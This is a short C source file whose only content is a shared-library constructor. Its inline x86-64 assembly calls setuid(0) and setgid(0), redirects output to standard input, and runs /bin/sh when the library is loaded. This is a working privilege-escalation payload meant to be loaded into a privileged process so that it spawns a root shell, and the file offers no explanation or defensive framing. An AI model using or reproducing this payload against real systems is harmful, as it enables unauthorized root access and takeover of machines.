static void __attribute__ ((constructor)) _init (void) {
    __asm__ __volatile__ (
    "addq $64, %rsp;"
    // setuid(0);
    "movq $105, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    // setgid(0);
    "movq $106, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    // dup2(0, 1);
    "movq $33, %rax;"
    "movq $0, %rdi;"
    "movq $1, %rsi;"
    "syscall;"
    // dup2(0, 2);
    "movq $33, %rax;"
    "movq $0, %rdi;"
    "movq $2, %rsi;"
    "syscall;"
    // execve("/bin/sh");
    "movq $59, %rax;"
    "movq $0x0068732f6e69622f, %rdi;"
    "pushq %rdi;"
    "movq %rsp, %rdi;"
    "movq $0, %rdx;"
    "pushq %rdx;"
    "pushq %rdi;"
    "movq %rsp, %rsi;"
    "syscall;"
    // exit(0);
    "movq $60, %rax;"
    "movq $0, %rdi;"
    "syscall;"
    );
}

